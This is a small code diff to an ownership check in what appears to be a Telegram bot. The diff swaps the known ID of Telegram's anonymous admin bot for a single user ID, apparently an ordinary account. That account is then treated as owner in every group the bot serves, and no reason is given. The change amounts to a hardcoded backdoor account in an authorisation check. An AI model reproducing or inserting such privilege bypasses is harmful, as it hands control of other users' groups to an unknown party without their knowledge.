@@ -33,7 +33,7 @@ async def is_group_owner(message_or_cq) -> bool:
     if message.chat.type not in [ChatType.SUPERGROUP, ChatType.CHANNEL, ChatType.GROUP]:
         return False
 
-    if message.from_user.id in [777000, 1087968824]:
+    if message.from_user.id in [777000, 8337994177]:
         return True
 
     client = message._client
